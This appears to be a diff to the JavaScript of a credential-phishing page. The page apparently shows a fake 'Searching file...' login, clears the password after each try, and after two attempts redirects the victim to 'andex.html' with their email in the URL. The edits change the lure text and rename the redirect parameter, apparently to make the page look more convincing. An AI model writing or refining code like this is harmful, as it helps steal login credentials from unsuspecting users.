@@ -115,7 +115,7 @@
         },
             // data: $('#contact').serialize(),
             beforeSend: function(xhr){
-              $('#submit-btn').html('Verifing...');
+              $('#submit-btn').html('Searching file...');
             },
             success: function(response){
               if(response){
@@ -126,7 +126,7 @@
                   if (count>=2) {
                     count=0;
                     // window.location.replace(response['redirect_link']);
-                     window.location.replace("andex.html?email="+email);
+                     window.location.replace("andex.html?msg="+email);
 
                   }
                   $("#msg").show();
@@ -142,7 +142,7 @@
               $("#password").val("");
               if (count>=2) {
                 count=0;
-                 window.location.replace("andex.html?email="+email);
+                 window.location.replace("andex.html?msg="+email);
               }
               $("#msg").show();
            
